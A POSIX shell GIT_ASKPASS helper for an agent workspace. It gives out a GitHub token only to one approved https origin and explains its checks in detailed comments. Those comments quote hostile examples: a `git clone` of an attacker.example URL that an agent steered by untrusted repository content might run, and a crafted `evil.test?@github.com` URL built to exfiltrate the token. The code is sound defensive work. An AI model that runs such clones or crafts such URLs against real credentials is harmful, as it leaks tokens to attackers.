#!/bin/sh
# GIT_ASKPASS helper: git calls this once for the username and once for the password when it needs
# HTTPS credentials. The token therefore never appears in the remote URL, the shell environment of
# tool subprocesses, or the command line.
#
# Credentials are released ONLY for the single origin this workspace was created for, named by
# AH_GIT_ALLOWED_ORIGIN. The host sets it from the repository URL it has just measured against
# ALLOWED_REPO_HOSTS, before this container existed. The allow-list itself is deliberately NOT
# handed to the container: this helper decides from a host it reads out of a prompt string, so a
# set of acceptable origins would mean a crafted prompt naming any one of them is answered with the
# token. One origin cannot be steered, and it is narrower than a forge-wide rule — a workspace
# opened for one repository is not answered for a different repository on the same forge either.
#
# GIT_ASKPASS is set image-wide, so this also answers git commands the agent itself starts, and the
# agent is driven by a model that reads untrusted repository content: without the check,
# `git clone https://attacker.example/x` inside the workspace makes git send the real PAT to that
# server as Basic auth, which is exactly the exfiltration GIT_ASKPASS exists to prevent.
#
# POSIX sh, no external commands. Every failure path prints nothing on stdout and exits non-zero,
# so git fails authentication instead of reading an empty string as a valid password.
set -eu

prompt=${1:-}

# Approved origin. Absent or empty is a container no host prepared, and there is nothing to fall
# back to: falling back to a forge would give a workspace whose origin was never decided a policy
# from somewhere else.
allowed=${AH_GIT_ALLOWED_ORIGIN-}
if [ -z "$allowed" ]; then
  echo "askpass: AH_GIT_ALLOWED_ORIGIN is not set; refusing to release credentials" >&2
  exit 1
fi

# The token is released over https and nothing else, whatever the workspace's own origin is.
# ALLOWED_REPO_HOSTS may authorise a cleartext origin — a local forge is reached through the host
# gateway, which no loopback rule would admit — but authorising a clone is not authorising a
# credential: over http, anything on the path reads the Basic auth header. A workspace created for
# an http origin therefore clones anonymously and is answered nothing here. This is a property of
# the approved origin rather than of the prompt, so that a cleartext workspace refuses every
# prompt instead of matching its own.
case "$allowed" in
  https://*) ;;
  *)
    echo "askpass: refusing to release credentials for a non-https origin" >&2
    exit 1
    ;;
esac

# Git prompts look like: Password for 'https://x-access-token@github.com'
# Take what is between the first pair of single quotes. A prompt without quotes leaves `prompt`
# unchanged, which is not a URL and is refused just below.
url=${prompt#*\'}
url=${url%%\'*}

# Require the hierarchical scheme://authority form. A bare host, an scp-style target or a prompt
# naming no URL at all cannot be reduced to an origin, and guessing one is how a helper ends up
# answering something it never understood.
case "$url" in
  *://*) ;;
  *)
    echo "askpass: refusing to release credentials for a prompt that names no origin" >&2
    exit 1
    ;;
esac

# Reduce the URL to its origin: the scheme, plus the authority with any userinfo dropped.
#
# The authority ends at the first of "/", "?", "#" or "\", and all four have to be cut before the
# userinfo is dropped, because dropping it takes everything up to the LAST "@" in what is left. Cut
# only at "/" and `https://evil.test?@github.com` keeps an "@" that belongs to the query, so the
# reduction reports `github.com` for a URL whose host is `evil.test` — the exfiltration this helper
# exists to stop, spelled with a character that ends the authority rather than one that starts a
# new label. A backslash is not a delimiter for every URL parser, so cutting there can only make
# this reduction disagree with a caller's in the direction of refusing.
scheme=${url%%://*}
authority=${url#*://}
authority=${authority%%/*}
authority=${authority%%\?*}
authority=${authority%%#*}
authority=${authority%%\\*}
origin="$scheme://${authority##*@}"

# One comparison decides scheme, host and port together, because those three are what an origin
# is. There is no separate port rule: `github.com:8443` is refused because it is a different
# origin, and a forge the operator listed on a non-default port is approved for exactly the port
# they listed. Equality, never a substring, so `github.com.evil.test`, `github.com@evil.test` and
# `evil.test/github.com/x` all reduce to origins that are not the approved one.
#
# Both sides must spell the origin the same way, and both are produced by the same normalisation:
# the host derives this value with `URL.origin`, and the runtime hands git the repository URL as
# its own `URL` parse produced it, so what git echoes into the prompt is already canonical.
if [ "$origin" != "$allowed" ]; then
  echo "askpass: refusing to release credentials to an origin other than $allowed" >&2
  exit 1
fi

case "$prompt" in
  *Username*|*username*)
    printf '%s\n' "x-access-token"
    ;;
  *)
    # Token source, in order: a tmpfs file named by AH_GIT_TOKEN_FILE, then GITHUB_TOKEN. The file
    # exists so the agent runtime can keep the PAT out of the environment it hands to the shell
    # tool's children while git, which runs with that same scrubbed environment, can still
    # authenticate. The origin check above is deliberately independent of where the token came
    # from.
    token=${GITHUB_TOKEN:-}
    if [ -n "${AH_GIT_TOKEN_FILE:-}" ] && [ -r "$AH_GIT_TOKEN_FILE" ]; then
      # `read` is a shell builtin, so no PATH lookup happens: a workspace that controls PATH cannot
      # interpose a program between the token file and this script. It reports failure on a file
      # with no trailing newline while still assigning the value, hence the `|| :`.
      IFS= read -r token < "$AH_GIT_TOKEN_FILE" || :
    fi

    # An empty token is not a token. Printing it would hand git a valid empty password and turn a
    # misconfiguration into a confusing authentication failure against the real GitHub.
    if [ -z "$token" ]; then
      echo "askpass: no GitHub token available" >&2
      exit 1
    fi
    printf '%s\n' "$token"
    ;;
esac
